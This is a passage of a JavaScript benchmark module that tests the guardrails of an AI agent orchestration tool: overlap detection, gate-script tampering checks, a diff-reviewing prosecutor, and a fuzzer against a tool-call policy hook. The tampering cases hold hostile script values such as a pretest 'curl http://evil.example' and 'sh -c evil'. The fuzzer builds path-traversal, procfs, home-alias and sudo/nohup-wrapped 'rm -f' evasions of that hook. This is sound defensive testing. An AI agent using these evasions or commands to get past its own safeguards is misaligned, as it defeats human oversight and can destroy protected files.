/**
 * Live Subsystem Evaluation Benchmarks for Antigravity Booster (`agb`).
 *
 * Complements `evals/live-bench.mjs` with 4 deterministic live subsystem benchmarks:
 * 1. `runLivePlanCompilerBenchmark()` — 30-case golden corpus for `validatePlan()`,
 *    `normalizePathspec()`, `forecastOverlaps()`, and `verifyGateScriptIntegrity()`.
 * 2. `runLiveProsecutorAndReviewBenchmark()` — 10 live contract & convergence checks
 *    for `prosecute()` (`lib/prosecute.mjs`) and `reviewFleet()` (`lib/review.mjs`).
 * 3. `runLiveSchedulerDagBenchmark()` — 3 end-to-end hermetic DAG & strike-recovery
 *    executions of `runPlan()` (`lib/scheduler.mjs`).
 * 4. `runLivePolicyFuzzerBenchmark()` — 120-case seeded metamorphic fuzzer across
 *    6 evasion/benign families against `evaluatePayload()` (`hooks/policy/evaluate.mjs`).
 */
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  realpathSync,
  rmSync,
  writeFileSync,
} from 'node:fs';
import { execFileSync } from 'node:child_process';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { performance } from 'node:perf_hooks';
import { mulberry32, median, p95 } from './stats.mjs';
import {
  validatePlan,
  normalizePathspec,
  validatePathspec,
  verifyGateScriptIntegrity,
} from '../lib/plan.mjs';
import { forecastOverlaps, preflight, hashTicketColdstart } from '../lib/preflight.mjs';
import { prosecute, prepareProsecutionPrecheck, blockingFindings } from '../lib/prosecute.mjs';
import { reviewFleet } from '../lib/review.mjs';
import { selectRiskTieredProsecutor } from '../lib/models.mjs';
import { DecisionEngine } from '../lib/decision-engine.mjs';
import { runPlan } from '../lib/scheduler.mjs';
import { writeAdlcTickets } from '../lib/adlc-bridge.mjs';
import { ticketFilename } from '@adlc/tickets';
import { evaluatePayload } from '../hooks/policy/evaluate.mjs';

const FAKE_AGY = fileURLToPath(new URL('../test/fixtures/fake-agy', import.meta.url));
const FAKE_ADLC = fileURLToPath(new URL('../test/fixtures/fake-adlc', import.meta.url));
const PLUGIN_ABSENT = fileURLToPath(new URL('../test/fixtures/plugin-does-not-exist', import.meta.url));

const HERMETIC_ENV_KEYS = [
  'NODE_ENV',
  'AGB_AGY_BIN',
  'AGB_ADLC_BIN',
  'AGB_ALLOW_CUSTOM_ADLC_CLI',
  'AGB_SANDBOX_GATES',
  'AGB_PLUGIN_DIR',
  'AGB_POOLS_DIR',
  'AGB_POOLS_V2',
  'AGB_POOLS_LOCK',
  'AGB_QUOTA_STATE',
  'FAKE_STATE_DIR',
  'FAKE_PROSECUTOR_VERDICT',
  'FAKE_HOLLOW_TEST_MODE',
  'FAKE_BUILDER_MODE',
  'FAKE_AGY_MODE',
];

async function withHermeticFakes(extraEnv, fn) {
  const tempRoot = realpathSync(mkdtempSync(join(tmpdir(), 'agb-subsys-eval-')));
  const poolsDir = join(tempRoot, 'pools');
  const stateDir = join(tempRoot, 'state');
  mkdirSync(poolsDir, { recursive: true });
  mkdirSync(stateDir, { recursive: true });

  const saved = {};
  for (const k of HERMETIC_ENV_KEYS) {
    saved[k] = process.env[k];
    delete process.env[k];
  }

  const targetEnv = {
    NODE_ENV: 'test',
    AGB_AGY_BIN: FAKE_AGY,
    AGB_ADLC_BIN: FAKE_ADLC,
    AGB_ALLOW_CUSTOM_ADLC_CLI: '1',
    AGB_SANDBOX_GATES: '0',
    AGB_PLUGIN_DIR: PLUGIN_ABSENT,
    AGB_POOLS_DIR: poolsDir,
    AGB_QUOTA_STATE: join(poolsDir, 'agb_pools_shared.json'),
    FAKE_STATE_DIR: stateDir,
    ...extraEnv,
  };

  for (const [k, v] of Object.entries(targetEnv)) {
    if (v !== undefined) process.env[k] = v;
  }

  try {
    return await fn({ tempRoot, poolsDir, stateDir });
  } finally {
    for (const k of HERMETIC_ENV_KEYS) {
      if (saved[k] === undefined) delete process.env[k];
      else process.env[k] = saved[k];
    }
    rmSync(tempRoot, { recursive: true, force: true });
  }
}

function normalizeTicketsForForecast(tickets) {
  return tickets.map((t) => ({
    ...t,
    scope: (t.scope ?? []).map(normalizePathspec),
    rails: (t.rails ?? []).map(normalizePathspec),
    edges: t.edges ?? [],
  }));
}

/**
 * 1. Plan Compiler, Scope-Overlap & Gate-Integrity Corpus (`lib/plan.mjs`, `lib/preflight.mjs`).
 */
export function runLivePlanCompilerBenchmark() {
  const t0 = performance.now();

  // 10 Concurrent Scope-Overlap Vectors (Must Veto)
  const concurrentOverlapCases = [
    {
      id: 'ov-01-exact-file-collision',
      tickets: [
        { id: 'T1', scope: ['src/a.mjs'], edges: [] },
        { id: 'T2', scope: ['src/a.mjs'], edges: [] },
      ],
    },
    {
      id: 'ov-02-parent-glob-vs-child',
      tickets: [
        { id: 'T1', scope: ['src/**'], edges: [] },
        { id: 'T2', scope: ['src/sub/b.mjs'], edges: [] },
      ],
    },
    {
      id: 'ov-03-wildcard-vs-file',
      tickets: [
        { id: 'T1', scope: ['src/*.mjs'], edges: [] },
        { id: 'T2', scope: ['src/index.mjs'], edges: [] },
      ],
    },
    {
      id: 'ov-04-diamond-concurrent-branches',
      tickets: [
        { id: 'T1', scope: ['src/root.mjs'], edges: [{ to: 'T2' }, { to: 'T3' }] },
        { id: 'T2', scope: ['lib/shared.mjs'], edges: [{ to: 'T4' }] },
        { id: 'T3', scope: ['lib/shared.mjs'], edges: [{ to: 'T4' }] },
        { id: 'T4', scope: ['src/sink.mjs'], edges: [] },
      ],
    },
    {
      id: 'ov-05-multi-scope-partial-intersection',
      tickets: [
        { id: 'T1', scope: ['src/a.mjs', 'shared/x.mjs'], edges: [] },
        { id: 'T2', scope: ['src/b.mjs', 'shared/**'], edges: [] },
      ],
    },
    {
      id: 'ov-06-three-ticket-pair-overlap',
      tickets: [
        { id: 'T1', scope: ['docs/api.md'], edges: [] },
        { id: 'T2', scope: ['docs/api.md'], edges: [] },
        { id: 'T3', scope: ['src/ok.mjs'], edges: [] },
      ],
    },
    {
      id: 'ov-07-deep-subtree-glob',
      tickets: [
        { id: 'T1', scope: ['packages/core/**'], edges: [] },
        { id: 'T2', scope: ['packages/core/src/index.mjs'], edges: [] },
      ],
    },
    {
      id: 'ov-08-trailing-slash-directory',
      tickets: [
        { id: 'T1', scope: ['src/utils/'], edges: [] },
        { id: 'T2', scope: ['src/utils/math.mjs'], edges: [] },
      ],
    },
    {
      id: 'ov-09-extension-glob-collision',
      tickets: [
        { id: 'T1', scope: ['test/*.test.mjs'], edges: [] },
        { id: 'T2', scope: ['test/plan.test.mjs'], edges: [] },
      ],
    },
    {
      id: 'ov-10-four-ticket-wave-collision',
      tickets: [
        { id: 'T1', scope: ['a/**'], edges: [] },
        { id: 'T2', scope: ['config/schema.json'], edges: [] },
        { id: 'T3', scope: ['b/**'], edges: [] },
        { id: 'T4', scope: ['config/**'], edges: [] },
      ],
    },
  ];

  // 10 Transitively Serialized or Disjoint DAG Vectors (Must Allow — 0 overlaps)
  const serializedOrDisjointCases = [
    {
      id: 'ser-01-direct-edge',
      tickets: [
        { id: 'T1', scope: ['src/a.mjs'], edges: [{ to: 'T2' }] },
        { id: 'T2', scope: ['src/a.mjs'], edges: [] },
      ],
    },
    {
      id: 'ser-02-three-hop-chain',
      tickets: [
        { id: 'T1', scope: ['src/a.mjs'], edges: [{ to: 'T2' }] },
        { id: 'T2', scope: ['src/b.mjs'], edges: [{ to: 'T3' }] },
        { id: 'T3', scope: ['src/a.mjs'], edges: [] },
      ],
    },
    {
      id: 'ser-03-four-hop-chain',
      tickets: [
        { id: 'T1', scope: ['src/**'], edges: [{ to: 'T2' }] },
        { id: 'T2', scope: ['docs/a.md'], edges: [{ to: 'T3' }] },
        { id: 'T3', scope: ['docs/b.md'], edges: [{ to: 'T4' }] },
        { id: 'T4', scope: ['src/**'], edges: [] },
      ],
    },
    {
      id: 'ser-04-diamond-root-and-sink',
      tickets: [
        { id: 'T1', scope: ['src/**'], edges: [{ to: 'T2' }, { to: 'T3' }] },
        { id: 'T2', scope: ['a/**'], edges: [{ to: 'T4' }] },
        { id: 'T3', scope: ['b/**'], edges: [{ to: 'T4' }] },
        { id: 'T4', scope: ['src/**'], edges: [] },
      ],
    },
    {
      id: 'ser-05-disjoint-sibling-dirs',
      tickets: [
        { id: 'T1', scope: ['src/a/**'], edges: [] },
        { id: 'T2', scope: ['src/b/**'], edges: [] },
      ],
    },
    {
      id: 'ser-06-disjoint-file-prefixes',
      tickets: [
        { id: 'T1', scope: ['src/auth.mjs'], edges: [] },
        { id: 'T2', scope: ['src/auth-helper.mjs'], edges: [] },
      ],
    },
    {
      id: 'ser-07-disjoint-extensions',
      tickets: [
        { id: 'T1', scope: ['src/app.mjs'], edges: [] },
        { id: 'T2', scope: ['src/app.css'], edges: [] },
      ],
    },
    {
      id: 'ser-08-fan-out-from-root',
      tickets: [
        { id: 'T1', scope: ['src/**'], edges: [{ to: 'T2' }, { to: 'T3' }] },
        { id: 'T2', scope: ['src/a.mjs'], edges: [] },
        { id: 'T3', scope: ['src/b.mjs'], edges: [] },
      ],
    },
    {
      id: 'ser-09-fan-in-to-sink',
      tickets: [
        { id: 'T1', scope: ['src/a.mjs'], edges: [{ to: 'T3' }] },
        { id: 'T2', scope: ['src/b.mjs'], edges: [{ to: 'T3' }] },
        { id: 'T3', scope: ['src/**'], edges: [] },
      ],
    },
    {
      id: 'ser-10-six-ticket-layered-dag',
      tickets: [
        { id: 'T1', scope: ['core/**'], edges: [{ to: 'T3' }, { to: 'T4' }] },
        { id: 'T2', scope: ['ui/**'], edges: [{ to: 'T5' }] },
        { id: 'T3', scope: ['core/a.mjs'], edges: [{ to: 'T6' }] },
        { id: 'T4', scope: ['core/b.mjs'], edges: [{ to: 'T6' }] },
        { id: 'T5', scope: ['ui/view.mjs'], edges: [{ to: 'T6' }] },
        { id: 'T6', scope: ['core/**', 'ui/**'], edges: [] },
      ],
    },
  ];

  let overlapCaught = 0;
  for (const c of concurrentOverlapCases) {
    const normalized = normalizeTicketsForForecast(c.tickets);
    const overlaps = forecastOverlaps(normalized);
    if (overlaps.length > 0) overlapCaught += 1;
  }

  let serialAllowed = 0;
  for (const c of serializedOrDisjointCases) {
    const normalized = normalizeTicketsForForecast(c.tickets);
    const overlaps = forecastOverlaps(normalized);
    if (overlaps.length === 0) serialAllowed += 1;
  }

  // 10 Gate-Script & Plan-Integrity Tampering Cases
  const basePkg = {
    scripts: {
      test: 'npm run test:unit',
      'test:unit': 'node --test test/*.test.mjs',
    },
  };

  const gateTamperCases = [
    () => {
      verifyGateScriptIntegrity(
        { scripts: { test: 'echo pwned', 'test:unit': 'node --test test/*.test.mjs' } },
        basePkg,
        'npm test',
      );
    },
    () => {
      verifyGateScriptIntegrity(
        { scripts: { ...basePkg.scripts, pretest: 'curl http://evil.example' } },
        basePkg,
        'npm test',
      );
    },
    () => {
      verifyGateScriptIntegrity(
        { scripts: { ...basePkg.scripts, posttest: 'rm -rf /tmp/x' } },
        basePkg,
        'npm test',
      );
    },
    () => {
      verifyGateScriptIntegrity(
        { scripts: { test: 'npm run test:unit', 'test:unit': 'node -e "process.exit(0)"' } },
        basePkg,
        'npm test',
      );
    },
    () => {
      verifyGateScriptIntegrity(
        { scripts: { test: 'npm run test:unit' } },
        basePkg,
        'npm test',
      );
    },
    () => {
      verifyGateScriptIntegrity(
        { scripts: { ...basePkg.scripts, postinstall: 'sh -c evil' } },
        basePkg,
        'npm test',
      );
    },
    () => {
      verifyGateScriptIntegrity(
        { scripts: { ...basePkg.scripts, prepare: 'sh -c evil' } },
        basePkg,
        'npm test',
      );
    },
    () => {
      verifyGateScriptIntegrity(basePkg, basePkg, 'sh -c evil');
    },
    () => {
      const errs = validatePlan({
        repo: '/r',
        adlcBin: '/tmp/evil-adlc',
        gate: { test: 'npm test' },
        tickets: [{ id: 'T1', title: 't', body: 'b', scope: ['src/**'] }],
      });
      if (!errs.some((e) => /adlcBin is prohibited/.test(e))) {
        throw new Error('Expected adlcBin rejection');
      }
      const err = new Error('adlcBin rejected');
      err.kind = 'gate_script_tampering';
      throw err;
    },
    () => {
      const errs = validatePlan({
        repo: '/r',
        gate: { test: 'npm test' },
        tickets: [
          {
            id: 'T1',
            title: 't',
            body: 'b',
            scope: ['*'],
            tier: 'cheap',
            pool_hint: 'claude',
          },
        ],
      });
      if (
        !errs.some((e) => /invalid scope pathspec/.test(e)) ||
        !errs.some((e) => /no model candidates/.test(e)) ||
        validatePathspec('../escape')
      ) {
        throw new Error('Expected pathspec and routability rejection');
      }
      const err = new Error('plan validation rejected');
      err.kind = 'gate_script_tampering';
      throw err;
    },
  ];

  let gateTamperBlocked = 0;
  for (const fn of gateTamperCases) {
    try {
      fn();
    } catch (err) {
      if (err?.kind === 'gate_script_tampering') gateTamperBlocked += 1;
    }
  }

  const validGateOk = verifyGateScriptIntegrity({ scripts: { ...basePkg.scripts } }, basePkg, 'npm test') === true;
  const elapsedMs = performance.now() - t0;

  const overlapRecall = overlapCaught / concurrentOverlapCases.length;
  const serialFalsePositiveRate =
    (serializedOrDisjointCases.length - serialAllowed) / serializedOrDisjointCases.length;
  const gateTamperBlockRate = gateTamperBlocked / gateTamperCases.length;

  return {
    ok:
      overlapRecall === 1.0 &&
      serialFalsePositiveRate === 0.0 &&
      gateTamperBlockRate === 1.0 &&
      validGateOk,
    overlapTotal: concurrentOverlapCases.length,
    overlapCaught,
    overlapRecall,
    serialTotal: serializedOrDisjointCases.length,
    serialAllowed,
    serialFalsePositiveRate,
    gateTamperTotal: gateTamperCases.length,
    gateTamperBlocked,
    gateTamperBlockRate,
    validGateOk,
    elapsedMs,
  };
}

/**
 * 2. Prosecutor & Review Fleet Mechanical Contract & Convergence Benchmark
 *    (`lib/prosecute.mjs`, `lib/review.mjs`).
 */
export async function runLiveProsecutorAndReviewBenchmark() {
  const t0 = performance.now();

  return withHermeticFakes({}, async ({ tempRoot }) => {
    const sampleTicket = {
      id: 'T-PROS',
      title: 'Prosecutor contract verification ticket',
      body: 'Implement feature with full unit tests.',
    };

    // 1. Empty diff blocked without model invocation
    const emptyRes = await prosecute({
      ticket: sampleTicket,
      diff: '   \n  ',
      model: 'Claude Sonnet 5.5 (High)',
    });
    const emptyDiffBlocked =
      emptyRes.verdict === 'block' &&
      emptyRes.findings.some((f) => f.charge === 'spec' && f.severity === 'critical');

    // 2. Oversize diff (> 120,000 chars) blocked to prevent boilerplate truncation bypass
    const oversizeRes = await prosecute({
      ticket: sampleTicket,
      diff: `+${'a'.repeat(120_050)}\n`,
      model: 'Claude Sonnet 5.5 (High)',
    });
    const oversizeDiffBlocked =
      oversizeRes.verdict === 'block' &&
      oversizeRes.findings.some((f) => f.charge === 'scope' && f.severity === 'critical');

    // 3. High-severity finding overrides model's 'ship' verdict
    process.env.FAKE_PROSECUTOR_VERDICT = 'ship-with-high';
    process.env.FAKE_HOLLOW_TEST_MODE = 'clean';
    const highOverrideRes = await prosecute({
      ticket: sampleTicket,
      diff: 'diff --git a/x.js b/x.js\n+const x = 1;\n',
      model: 'Claude Sonnet 5.5 (High)',
      worktree: tempRoot,
      testCmd: 'npm test',
    });
    const highSeverityOverridesShip =
      highOverrideRes.verdict === 'block' &&
      highOverrideRes.hollowTest?.survived === 0 &&
      blockingFindings(highOverrideRes.findings).length === 1;

    // 4. Critical-severity finding overrides model's 'ship' verdict
    process.env.FAKE_PROSECUTOR_VERDICT = 'ship-with-critical';
    process.env.FAKE_HOLLOW_TEST_MODE = 'clean';
    const critOverrideRes = await prosecute({
      ticket: sampleTicket,
      diff: 'diff --git a/x.js b/x.js\n+const x = 1;\n',
      model: 'Claude Sonnet 5.5 (High)',
      worktree: tempRoot,
      testCmd: 'npm test',
    });
    const criticalSeverityOverridesShip =
      critOverrideRes.verdict === 'block' &&
      blockingFindings(critOverrideRes.findings)[0]?.severity === 'critical';

    // 5. Low-severity finding preserves model's 'ship' verdict
    process.env.FAKE_PROSECUTOR_VERDICT = 'ship-with-low';
    process.env.FAKE_HOLLOW_TEST_MODE = 'clean';
    const lowPreservesRes = await prosecute({
      ticket: sampleTicket,
      diff: 'diff --git a/x.js b/x.js\n+const x = 1;\n',
      model: 'Claude Sonnet 5.5 (High)',
      worktree: tempRoot,
      testCmd: 'npm test',
    });
    const lowSeverityPreservesShip =
      lowPreservesRes.verdict === 'ship' &&
      lowPreservesRes.findings.length === 1 &&
      blockingFindings(lowPreservesRes.findings).length === 0;

    // 6. Surviving AST mutant (`adlc hollow-test`) overrides model's 'ship' verdict
    process.env.FAKE_PROSECUTOR_VERDICT = 'ship';
    process.env.FAKE_HOLLOW_TEST_MODE = 'survivors';
    const hollowOverrideRes = await prosecute({
      ticket: sampleTicket,
      diff: 'diff --git a/x.js b/x.js\n+const x = 1;\n',
      model: 'Claude Sonnet 5.5 (High)',
      worktree: tempRoot,
      testCmd: 'npm test',
    });
    const hollowTestSurvivorOverridesShip =
      hollowOverrideRes.verdict === 'block' &&
      hollowOverrideRes.hollowTest?.survived === 1 &&
      hollowOverrideRes.findings.some((f) => f.charge === 'tests' && f.severity === 'critical');

    // 7. Block with empty findings array rejected as schema_violation
    process.env.FAKE_PROSECUTOR_VERDICT = 'block-empty';
    process.env.FAKE_HOLLOW_TEST_MODE = 'clean';
    const emptyBlockRes = await prosecute({
      ticket: sampleTicket,
      diff: 'diff --git a/x.js b/x.js\n+const x = 1;\n',
      model: 'Claude Sonnet 5.5 (High)',
      worktree: tempRoot,
      testCmd: 'npm test',
    });
    const emptyBlockRejectedAsSchemaViolation =
      emptyBlockRes.verdict === 'error' && emptyBlockRes.kind === 'schema_violation';

    // Review Fleet Check 1: Clean 4-lens convergence in 2 dry rounds (8 requests)
    process.env.FAKE_PROSECUTOR_VERDICT = 'ship';
    const cleanReview = await reviewFleet({
      diff: 'diff --git a/x.js b/x.js\n+const x = 1;\n',
      lenses: ['correctness', 'security', 'tests', 'contracts'],
      dryRounds: 2,
      maxRounds: 4,
      project: 'eval-review-clean',
    });
    const cleanConvergenceInDryRounds =
      cleanReview.converged === true &&
      cleanReview.rounds === 2 &&
      cleanReview.requests === 8 &&
      cleanReview.findings.length === 0;

    // Review Fleet Check 2: Cross-lens deduplication + subsequent dry-round convergence
    process.env.FAKE_PROSECUTOR_VERDICT = 'block';
    const dedupReview = await reviewFleet({
      diff: 'diff --git a/x.js b/x.js\n+const x = 1;\n',
      lenses: ['correctness', 'security', 'tests', 'contracts'],
      dryRounds: 2,
      maxRounds: 4,
      project: 'eval-review-dedup',
    });
    const crossLensDeduplication =
      dedupReview.converged === true &&
      dedupReview.rounds === 3 &&
      dedupReview.requests === 12 &&
      dedupReview.findings.length === 1;

    // Review Fleet Check 3: Lens admission/execution error prevents false convergence
    process.env.FAKE_PROSECUTOR_VERDICT = 'ship';
    let acquireCalls = 0;
    const failingPools = {
      quota: { raw: {}, models: {} },
      refreshQuota: async () => ({ ok: true }),
      acquire: async (model) => {
        acquireCalls += 1;
        if (acquireCalls % 2 === 0 || String(model).toLowerCase().includes('argon')) {
          throw new Error('simulated pool admission failure');
        }
        return () => {};
      },
    };
    const origError = console.error;
    let errorReview;
    try {
      console.error = () => {};
      errorReview = await reviewFleet({
        diff: 'diff --git a/x.js b/x.js\n+const x = 1;\n',
        lenses: ['correctness', 'security'],
        dryRounds: 1,
        maxRounds: 2,
        pools: failingPools,
        project: 'eval-review-error',
      });
    } finally {
      console.error = origError;
    }
    const lensErrorPreventsFalseConvergence =
      errorReview.converged === false && errorReview.errors.length > 0;

    const checks = {
      emptyDiffBlocked,
      oversizeDiffBlocked,
      highSeverityOverridesShip,
      criticalSeverityOverridesShip,
      lowSeverityPreservesShip,
      hollowTestSurvivorOverridesShip,
      emptyBlockRejectedAsSchemaViolation,
      cleanConvergenceInDryRounds,
      crossLensDeduplication,
      lensErrorPreventsFalseConvergence,
    };

    const passedChecks = Object.values(checks).filter(Boolean).length;
    const totalChecks = Object.keys(checks).length;

    return {
      ok: passedChecks === totalChecks,
      passedChecks,
      totalChecks,
      passRate: passedChecks / totalChecks,
      checks,
      elapsedMs: performance.now() - t0,
    };
  });
}

function makeHermeticGitRepo() {
  const dir = realpathSync(mkdtempSync(join(tmpdir(), 'agb-eval-sched-repo-')));
  const g = (...args) => execFileSync('git', args, { cwd: dir, encoding: 'utf8' });
  g('init', '-q', '-b', 'main');
  g('config', 'user.email', 'eval@agb.local');
  g('config', 'user.name', 'agb-eval');
  g('config', 'commit.gpgsign', 'false');
  writeFileSync(join(dir, 'README.md'), '# eval repo\n', 'utf8');
  writeFileSync(join(dir, '.gitignore'), '.worktrees/\n.booster/\n', 'utf8');
  g('add', '-A');
  g('commit', '-qm', 'init');
  return dir;
}

/**
 * 3. Live Hermetic Scheduler DAG & Strike-Recovery Benchmark (`lib/scheduler.mjs`).
 */
export async function runLiveSchedulerDagBenchmark() {
  const t0 = performance.now();

  // Scenario 1: 4-ticket diamond DAG declared in reverse topological order
  const diamondResult = await withHermeticFakes({}, async ({ poolsDir }) => {
    const repo = makeHermeticGitRepo();
    try {
      const report = await runPlan(
        {
          repo,
          gate: { test: 'true' },
          tickets: [
            { id: 'T4', title: 'sink', body: 'write T4.txt', scope: ['T4.txt'], edges: [] },
            { id: 'T3', title: 'right', body: 'write T3.txt', scope: ['T3.txt'], edges: [{ to: 'T4' }] },
            { id: 'T2', title: 'left', body: 'write T2.txt', scope: ['T2.txt'], edges: [{ to: 'T4' }] },
            {
              id: 'T1',
              title: 'root',
              body: 'write T1.txt',
              scope: ['T1.txt'],
              edges: [{ to: 'T2' }, { to: 'T3' }],
            },
          ],
        },
        { log: () => {} },
      );

      const totalRequests = Object.values(report.requests ?? {}).reduce((a, b) => a + b, 0);
      const v2Path = join(poolsDir, 'agb_pools_v2.json');
      let leakedLeases = 0;
      if (existsSync(v2Path)) {
        const v2 = JSON.parse(readFileSync(v2Path, 'utf8'));
        leakedLeases = Object.values(v2.leases ?? {}).filter(
          (l) => l && l.state === 'ACTIVE' && Date.now() <= l.leaseExpiryMs,
        ).length;
      }

      const topoOrderValid =
        report.merged.length === 4 &&
        report.merged.indexOf('T1') === 0 &&
        report.merged.indexOf('T2') < report.merged.indexOf('T4') &&
        report.merged.indexOf('T3') < report.merged.indexOf('T4') &&
        report.merged.indexOf('T4') === 3;

      return {
        ok:
          topoOrderValid &&
          Object.keys(report.failed).length === 0 &&
          totalRequests === 8 &&
          leakedLeases === 0,
        mergedCount: report.merged.length,
        mergedOrder: report.merged,
        canonicalOrder: topoOrderValid ? 'T1 -> {T2, T3} -> T4' : report.merged.join(' -> '),
        topoOrderValid,
        totalRequests,
        leakedLeases,
      };
    } finally {
      rmSync(repo, { recursive: true, force: true });
    }
  });

  // Scenario 2: 1st-strike prosecutor block -> fix -> re-gate -> 2nd-strike ship
  const fixRecoveryResult = await withHermeticFakes(
    { FAKE_PROSECUTOR_VERDICT: 'block-then-ship' },
    async ({ stateDir }) => {
      const repo = makeHermeticGitRepo();
      try {
        const report = await runPlan(
          {
            repo,
            gate: { test: 'true' },
            tickets: [{ id: 'T1', title: 'fixable', body: 'write T1.txt', scope: ['T1.txt'], edges: [] }],
          },
          { log: () => {} },
        );
        const totalRequests = Object.values(report.requests ?? {}).reduce((a, b) => a + b, 0);
        const prosecutions = Number(readFileSync(join(stateDir, 'prosecutions'), 'utf8').trim());
        return {
          ok:
            report.merged.length === 1 &&
            report.merged[0] === 'T1' &&
            Object.keys(report.failed).length === 0 &&
            prosecutions === 2 &&
            totalRequests === 3,
          mergedCount: report.merged.length,
          prosecutions,
          totalRequests,
        };
      } finally {
        rmSync(repo, { recursive: true, force: true });
      }
    },
  );

  // Scenario 3: Strike 1 transient failure -> Strike 2 warm regeneration -> merge
  const strikeTwoRegenResult = await withHermeticFakes(
    { FAKE_BUILDER_MODE: 'transient-then-good' },
    async ({ stateDir }) => {
      const repo = makeHermeticGitRepo();
      try {
        const report = await runPlan(
          {
            repo,
            gate: { test: 'grep -q "did the work" T1.txt' },
            tickets: [{ id: 'T1', title: 'regen', body: 'write T1.txt', scope: ['T1.txt'], edges: [] }],
          },
          { log: () => {} },
        );
        const totalRequests = Object.values(report.requests ?? {}).reduce((a, b) => a + b, 0);
        const builds = Number(readFileSync(join(stateDir, 'builds'), 'utf8').trim());
        const content = existsSync(join(repo, 'T1.txt'))
          ? readFileSync(join(repo, 'T1.txt'), 'utf8')
          : '';
        return {
          ok:
            report.merged.length === 1 &&
            report.merged[0] === 'T1' &&
            Object.keys(report.failed).length === 0 &&
            builds === 2 &&
            totalRequests === 3 &&
            content.includes('did the work'),
          mergedCount: report.merged.length,
          builds,
          totalRequests,
        };
      } finally {
        rmSync(repo, { recursive: true, force: true });
      }
    },
  );

  return {
    ok: diamondResult.ok && fixRecoveryResult.ok && strikeTwoRegenResult.ok,
    scenarios: {
      diamondDagReverseOrder: diamondResult,
      prosecutorBlockThenFixRecovery: fixRecoveryResult,
      strikeOneGateFailThenStrikeTwoRegenRecovery: strikeTwoRegenResult,
    },
    elapsedMs: performance.now() - t0,
  };
}

/**
 * 4. Seeded Metamorphic Fuzzing of `PreToolUse` Policy (`hooks/policy/*`).
 */
export function runLivePolicyFuzzerBenchmark({ seed = 20261030 } = {}) {
  const rng = mulberry32(seed);
  const fuzzRoot = realpathSync(mkdtempSync(join(tmpdir(), 'agb-eval-fuzz-')));
  const fakeHome = join(fuzzRoot, 'home');
  const repoRoot = join(fuzzRoot, 'repo');

  try {
    mkdirSync(join(fakeHome, '.gemini', 'antigravity-cli', 'plugin_data', 'antigravity-booster'), {
      recursive: true,
    });
    mkdirSync(join(fakeHome, '.local', 'share', 'fnm'), { recursive: true });
    mkdirSync(join(fakeHome, '.config', 'antigravity-booster'), { recursive: true });
    mkdirSync(join(repoRoot, '.git', 'hooks'), { recursive: true });
    mkdirSync(join(repoRoot, '.adlc', 'ticket-archive'), { recursive: true });
    writeFileSync(join(repoRoot, '.adlc', 'config.json'), '{}\n', 'utf8');
    mkdirSync(join(repoRoot, 'lib'), { recursive: true });
    writeFileSync(join(repoRoot, 'lib', 'lock.mjs'), '// rail\n', 'utf8');
    writeFileSync(join(repoRoot, 'lib', 'gates.mjs'), '// rail\n', 'utf8');
    mkdirSync(join(repoRoot, 'src'), { recursive: true });
    writeFileSync(join(repoRoot, 'src', 'feature-0.mjs'), '// in-scope\n', 'utf8');

    const fuzzTicket = {
      id: 't-fuzz-worker',
      title: 'Metamorphic fuzzer active ticket',
      body: 'Active ticket with declared rails and scope for metamorphic policy fuzzing.',
      scope: ['src/**'],
      rails: ['lib/lock.mjs', 'lib/gates.mjs'],
      edges: [],
    };
    writeAdlcTickets(repoRoot, [fuzzTicket]);
    const existingShardPath = join(repoRoot, '.adlc', 'tickets', ticketFilename(fuzzTicket.id));

    const pick = (arr) => arr[Math.floor(rng() * arr.length)];

    const adversarialCases = [];

    // Family 1 (20 cases): Path traversal, redundant separators, and dot segments on rails/trust-root
    const protectedTargets = [
      join(repoRoot, '.adlc', 'config.json'),
      existingShardPath,
      join(repoRoot, 'lib', 'lock.mjs'),
      join(repoRoot, 'lib', 'gates.mjs'),
      join(fakeHome, '.gemini', 'settings.json'),
    ];
    const pathMutations = [
      (p) => p.replace('/lib/', '//lib///'),
      (p) => p.replace('/.adlc/', '/./.adlc/./'),
      (p) => `${repoRoot}/src/../${p.slice(repoRoot.length + 1)}`,
      (p) => `${repoRoot}/lib/../.adlc/config.json`,
    ];
    const mutatingTools = [
      (target) => ({ name: 'write_file', args: { Path: target, Content: 'x' } }),
      (target) => ({ name: 'edit_file', args: { Path: target, Target: 'a', Replacement: 'b' } }),
      (target) => ({ name: 'delete_file', args: { TargetFile: target } }),
      (target) => ({ name: 'move', args: { source: target, destination: join(repoRoot, 'src', 'out.mjs') } }),
    ];
    for (let i = 0; i < 20; i++) {
      const baseTarget = protectedTargets[i % protectedTargets.length];
      const mutFn = pathMutations[i % pathMutations.length];
      const toolFn = mutatingTools[i % mutatingTools.length];
      const mutatedPath = baseTarget.startsWith(repoRoot) ? mutFn(baseTarget) : baseTarget.replace('/.gemini/', '//.gemini/./');
      adversarialCases.push({
        family: 'pathTraversalAndNormalization',
        toolCall: toolFn(mutatedPath),
        env: { AGB_WORKER_TICKET: fuzzTicket.id },
      });
    }

    // Family 2 (20 cases): Procfs root prefixes, tilde/home aliases, and file:// URLs
    const procPrefixes = ['/proc/self/root', '/proc/thread-self/root', `/proc/${1000 + Math.floor(rng() * 8000)}/root`];
    const homeTargets = [
      '~/.gemini/config/plugins/antigravity-booster/plugin.json',
      '~/.local/share/fnm/aliases/default/bin/node',
      '~/.config/antigravity-booster/config.json',
      '~/.local/bin/agb',
    ];
    for (let i = 0; i < 20; i++) {
      let target;
      if (i % 3 === 0) {
        const pfx = procPrefixes[i % procPrefixes.length];
        target = `${pfx}${join(fakeHome, '.gemini', 'settings.json')}`;
      } else if (i % 3 === 1) {
        target = homeTargets[i % homeTargets.length];
      } else {
        target = `file://localhost${join(repoRoot, 'lib', 'lock.mjs')}`;
      }
      adversarialCases.push({
        family: 'procfsAndHomeAliasEvasion',
        toolCall: { name: 'write_file', args: { Path: target, Content: 'pwn' } },
        env: {},
      });
    }

    // Family 3 (20 cases): Shell prefix wrappers around destructive/write commands
    const prefixes = ['command', 'builtin', 'env FOO=1', 'nice', 'nohup', 'time', 'sudo'];
    const shellTargets = ['lib/lock.mjs', 'lib/gates.mjs', '.adlc/config.json', '~/.gemini/settings.json'];
    const shellVerbs = [
      (t) => `rm -f ${t}`,
      (t) => `cp README.md ${t}`,
      (t) => `mv ${t} src/moved.mjs`,
      (t) => `tee ${t}`,
      (t) => `sed -i 's/a/b/' ${t}`,
    ];
    for (let i = 0; i < 20; i++) {
      const pfx = prefixes[i % prefixes.length];
